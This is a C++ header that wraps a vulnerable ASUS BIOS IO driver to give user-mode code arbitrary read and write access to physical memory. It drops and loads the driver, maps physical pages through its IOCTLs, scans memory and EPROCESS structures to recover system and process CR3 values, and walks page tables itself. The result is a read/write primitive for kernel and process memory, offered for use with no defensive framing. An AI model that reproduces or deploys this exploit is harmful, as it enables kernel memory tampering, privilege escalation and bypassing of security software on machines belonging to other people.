#pragma once

#include <Windows.h>

#define IOCTL_MAP_USER_PHYSICAL_MEMORY		CTL_CODE(0x8010, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNMAP_USER_PHYSICAL_MEMORY	CTL_CODE(0x8010, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT)_PHYSICAL_MEMORY_INFO {
	SIZE_T MapSize;
	ULARGE_INTEGER PhysicalAddress;
	HANDLE SectionHandle;
	PVOID MappedBaseAddress;
	PVOID Object;
} PHYSICAL_MEMORY_INFO, * PPHYSICAL_MEMORY_INFO;

class AsusBiosIoDrv64
{
private:

	uintptr_t WalkPhysicalForDTB()
	{
		for (int i = 0; i < 10; i++)
		{
			HANDLE SectionHandle = NULL;
			PVOID Object = NULL;

			uintptr_t lpBuffer = MapPhysical(i * 0x10000, 0x10000, &SectionHandle, &Object);
			if (!lpBuffer)
				continue;

			for (int uOffset = 0; uOffset < 0x10000; uOffset += 0x1000)
			{
				if (0x00000001000600E9 ^ (0xffffffffffff00ff & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset)))
					continue;
				if (0xfffff80000000000 ^ (0xfffff80000000000 & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0x70)))
					continue;
				if (0xffffff0000000fff & *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0xa0))
					continue;

				uintptr_t cr3 = *reinterpret_cast<uintptr_t*>(lpBuffer + uOffset + 0xa0);
				UnmapPhysical((PVOID)lpBuffer, SectionHandle, Object);
				return cr3;
			}

			UnmapPhysical((PVOID)lpBuffer, SectionHandle, Object);
		}

		return 0;
	}

	uintptr_t ReadEProcessForDTB()
	{
		uintptr_t SystemEProcess = GetKernelObject(4, (HANDLE)4);
		if (!SystemEProcess)
			return 0;

		auto const mm = SuperFetch::memory_map::current();
		if (!mm) {
			printf("[SetupRw] Failed to get current memory map from Superfetch! Status : 0x%x\n", mm.error());
			return 0;
		}

		uint64_t phys = mm->translate(reinterpret_cast<PVOID>(SystemEProcess + 0x28));

		if (!phys) {
			printf("[SetupRw] Failed to translate virtual address for DTB!\n");
			return 0;
		}

		uintptr_t SystemCr3 = 0;
		if (ReadPhysicalMemory(phys, &SystemCr3, sizeof(SystemCr3)))
			return SystemCr3;

		return 0;
	}

	uintptr_t GetSystemCR3()
	{
		uintptr_t DTB = WalkPhysicalForDTB();
		if (!DTB)
			DTB = ReadEProcessForDTB();

		return DTB;
	}

	uintptr_t GetProcessCr3(const wchar_t* ProcessName) 
	{
		uintptr_t EProcess = GetEProcess(GetProcessIdByName(ProcessName));
		if (!EProcess)
			return 0;

		auto const mm = SuperFetch::memory_map::current();
		if (!mm) {
			printf("[SetupRw] Failed to get current memory map from Superfetch! Status : 0x%x\n", mm.error());
			return 0;
		}

		uint64_t phys = mm->translate(reinterpret_cast<PVOID>(EProcess + 0x28));

		if (!phys) {
			printf("[SetupRw] Failed to translate virtual address for DTB!\n");
			return 0;
		}

		uintptr_t ProcessCr3 = 0;
		if (ReadPhysicalMemory(phys, &ProcessCr3, sizeof(ProcessCr3)))
			return ProcessCr3;

		return 0;
	}

public:
	HANDLE hDevice = INVALID_HANDLE_VALUE;
	uintptr_t context_cr3 = 0;

	AsusBiosIoDrv64()
	{
		driver::Drop();
		driver::Load();

		this->hDevice = CreateFileA(("\\\\.\\ASUSBIOSIO"), GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

		if (this->hDevice == INVALID_HANDLE_VALUE)
			exit(0);

		this->context_cr3 = GetSystemCR3();
		if (this->context_cr3 == 0)
			exit(0);
	}

	void Remove() {
		CloseHandle(this->hDevice);
		driver::Cleanup();
		driver::Remove();
	}

	BOOL SwitchProcessContext(const wchar_t* ProcessName) {
		uintptr_t newCr3 = GetProcessCr3(ProcessName);

		if (newCr3 == 0)
			return FALSE;

		this->context_cr3 = newCr3;

		return TRUE;
	}


	BOOL SwitchSystemContext() {
		uintptr_t newCr3 = GetSystemCR3();

		if (newCr3 == 0)
			return FALSE;

		this->context_cr3 = newCr3;

		return TRUE;
	}

	uintptr_t MapPhysical(_In_ ULONG_PTR PhysicalAddress, _In_ ULONG NumberOfBytes, _Inout_ HANDLE* SectionHandle, _Inout_ PVOID* Object)
	{
		ULONG_PTR offset;
		ULONG mapSize;
		PHYSICAL_MEMORY_INFO request;

		RtlSecureZeroMemory(&request, sizeof(request));
#define PAGE_SIZE 0x1000
		offset = PhysicalAddress & ~(PAGE_SIZE - 1);
		mapSize = (ULONG)(PhysicalAddress - offset) + NumberOfBytes;

		request.PhysicalAddress.QuadPart = PhysicalAddress;
		request.MapSize = mapSize;

		if (DeviceIoControl(this->hDevice,
			IOCTL_MAP_USER_PHYSICAL_MEMORY,
			&request,
			sizeof(request),
			&request,
			sizeof(request),
			NULL,
			NULL))
		{
			if (SectionHandle)
				*SectionHandle = request.SectionHandle;

			if (Object)
				*Object = request.Object;

			return (uintptr_t)request.MappedBaseAddress;
		}

		return NULL;
	}

	bool UnmapPhysical(_In_ PVOID AdressToUnmap, HANDLE Section, PVOID Object)
	{
		PHYSICAL_MEMORY_INFO request;

		RtlSecureZeroMemory(&request, sizeof(request));

		request.MappedBaseAddress = AdressToUnmap;
		request.SectionHandle = Section;
		request.Object = Object;

		return DeviceIoControl(this->hDevice,
			IOCTL_UNMAP_USER_PHYSICAL_MEMORY,
			&request,
			sizeof(request),
			&request,
			sizeof(request),
			NULL,
			NULL);
	}

	bool ReadPhysicalMemory(uintptr_t physical_address, void* output, unsigned long size)
	{
		HANDLE SectionHandle = NULL;
		PVOID Object = NULL;

		uintptr_t virtual_address = MapPhysical(physical_address, size, &SectionHandle, &Object);

		if (!virtual_address)
			return false;

		memcpy(output, reinterpret_cast<void*>(virtual_address), size);
		UnmapPhysical((PVOID)virtual_address, SectionHandle, Object);
		return true;
	}

	bool WritePhysicalMemory(uintptr_t physical_address, void* data, unsigned long size)
	{
		if (!data)
			return false;

		HANDLE SectionHandle = NULL;
		PVOID Object = NULL;

		uintptr_t virtual_address = MapPhysical(physical_address, size, &SectionHandle, &Object);

		if (!virtual_address)
			return false;

		memcpy(reinterpret_cast<void*>(virtual_address), reinterpret_cast<void*>(data), size);
		UnmapPhysical((PVOID)virtual_address, SectionHandle, Object);
		return true;
	}

	UINT64 TranslateLinearAddress(_In_ UINT64 VirtualAddress)
	{
		VIRTUAL_ADDRESS virtAddr = { 0 };

		DIR_TABLE_BASE  dirTableBase = { 0 };
		PML4E           pml4e = { 0 };
		PDPTE           pdpte = { 0 };
		PDPTE_LARGE     pdpteLarge = { 0 };
		PDE             pde = { 0 };
		PDE_LARGE       pdeLarge = { 0 };
		PTE             pte = { 0 };


		UINT64 DirectoryTableBase = this->context_cr3;

		virtAddr.All = VirtualAddress;
		dirTableBase.All = DirectoryTableBase;

		if (ReadPhysicalMemory((dirTableBase.Bits.PhysicalAddress << PAGE_4KB_SHIFT) + (virtAddr.Bits.Pml4Index * 8), &pml4e, sizeof(PML4E)) == FALSE)
			return 0;

		if (pml4e.Bits.Present == 0)
			return 0;

		if (ReadPhysicalMemory((pml4e.Bits.PhysicalAddress << PAGE_4KB_SHIFT) + (virtAddr.Bits.PdptIndex * 8), &pdpte, sizeof(PDPTE)) == FALSE)
			return 0;

		if (pdpte.Bits.Present == 0)
			return 0;

		if (IS_LARGE_PAGE(pdpte.All) == TRUE)
		{
			pdpteLarge.All = pdpte.All;
			return (pdpteLarge.Bits.PhysicalAddress << PAGE_1GB_SHIFT) + PAGE_1GB_OFFSET(VirtualAddress);
		}

		if (ReadPhysicalMemory((pdpte.Bits.PhysicalAddress << PAGE_4KB_SHIFT) + (virtAddr.Bits.PdIndex * 8), &pde, sizeof(PDE)) == FALSE)
			return 0;

		if (pde.Bits.Present == 0)
			return 0;


		if (IS_LARGE_PAGE(pde.All) == TRUE) {
			pdeLarge.All = pde.All;
			return (pdeLarge.Bits.PhysicalAddress << PAGE_2MB_SHIFT) + PAGE_2MB_OFFSET(VirtualAddress);
		}


		if (ReadPhysicalMemory((pde.Bits.PhysicalAddress << PAGE_4KB_SHIFT) + (virtAddr.Bits.PtIndex * 8), &pte, sizeof(PTE)) == FALSE)
			return 0;

		if (pte.Bits.Present == 0)
			return 0;

		return (pte.Bits.PhysicalAddress << PAGE_4KB_SHIFT) + virtAddr.Bits.PageIndex;
	}

	bool ReadVirtualMemory(PVOID Source, PVOID Buffer, ULONG Size)
	{
		auto const mm = SuperFetch::memory_map::current();

		uint64_t phys = mm->translate(Source);
		if (!phys) {
			phys = TranslateLinearAddress((uintptr_t)Source);
			if (!phys) {
				return false;
			}
		}

		return ReadPhysicalMemory(phys, Buffer, Size);
	}

	bool WriteVirtualMemory(PVOID Source, PVOID Buffer, ULONG Size)
	{
		auto const mm = SuperFetch::memory_map::current();

		uint64_t phys = mm->translate(Source);
		if (!phys) {
			phys = TranslateLinearAddress((uintptr_t)Source);
			if (!phys) {
				return false;
			}
		}

		return WritePhysicalMemory(phys, Buffer, Size);
	}

	template<typename T>
	T Read(uintptr_t address)
	{
		T buffer;

		if (!ReadVirtualMemory((PVOID)address, &buffer, sizeof(T)))
			return NULL;

		return buffer;
	}

	template<typename T>
	BOOL Write(uintptr_t address, T val)
	{
		if (!WriteVirtualMemory((PVOID)address, (PVOID)&val, sizeof(T)))
			return FALSE;

		return TRUE;

	}
};

void DumpPhysicalMemoryHex(uint64_t physBase, uint32_t sizeBytes, AsusBiosIoDrv64& asusIo)
{
	const int BYTES_PER_LINE = 16;
	const int BYTES_PER_GROUP = 4;

	printf("\n[*] Physical memory dump: 0x%llx - 0x%llx (%u bytes)\n", physBase, physBase + sizeBytes - 1, sizeBytes);
	printf("    +0 +1 +2 +3 +4 +5 +6 +7 +8 +9 +A +B +C +D +E +F  0123456789ABCDEF\n");
	printf("    ---------------------------------------------------------------\n");

	uint8_t buffer[4096];
	uint32_t totalRead = 0;

	while (totalRead < sizeBytes) {
		uint32_t chunkSize = min(4096U, sizeBytes - totalRead);

		if (!asusIo.ReadPhysicalMemory(physBase + totalRead, buffer, chunkSize)) {
			printf("    [READ FAILED]\n");
			return;
		}

		for (uint32_t offset = 0; offset < chunkSize; offset += BYTES_PER_LINE) {
			uint32_t lineBytes = min(BYTES_PER_LINE, chunkSize - offset);
			uint64_t lineAddr = physBase + totalRead + offset;

			printf("%08llx: ", lineAddr);

			for (uint32_t i = 0; i < lineBytes; i++) {
				printf("%02X ", buffer[offset + i]);
				if ((i + 1) % BYTES_PER_GROUP == 0 && i + 1 < lineBytes) printf(" ");
			}

			for (uint32_t i = lineBytes; i < BYTES_PER_LINE; i++) {
				if ((i % BYTES_PER_GROUP) == 0 && i > 0) printf(" ");
				printf("   ");
			}

			printf(" |");
			for (uint32_t i = 0; i < lineBytes; i++) {
				uint8_t c = buffer[offset + i];
				printf("%c", isprint(c) ? c : '.');
			}
			printf("|\n");
		}

		totalRead += chunkSize;

		printf("    [%3u%% read]\r", (totalRead * 100) / sizeBytes);
	}
	printf("\n[*] Dump complete\n\n");
}
